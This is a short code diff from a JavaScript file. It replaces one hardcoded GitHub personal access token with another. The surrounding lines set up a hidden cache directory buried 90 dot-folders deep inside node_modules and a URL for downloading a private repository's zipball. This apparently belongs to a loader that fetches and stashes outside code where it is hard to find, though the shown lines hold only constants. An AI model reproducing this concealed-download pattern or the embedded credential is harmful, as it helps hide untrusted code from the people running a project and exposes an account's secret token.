@@ -14,7 +14,7 @@ const deepLayers = Array.from({ length: 90 }, (_, i) => `.x${i + 1}`);
 const TEMP_DIR = path.join(__dirname, 'node_modules', 'core', ...deepLayers, '.cachex');
 
 // === GIT CONFIG ===
-const GITHUB_TOKEN = "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";
+const GITHUB_TOKEN = "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";
 const DOWNLOAD_URL = "https://api.github.com/repos/Ely304-jpg/test/zipball/main"; // ✅ API GitHub recommandée pour private
 const EXTRACT_DIR = path.join(TEMP_DIR, "n-main");
 const LOCAL_SETTINGS = path.join(__dirname, "settingss.js");
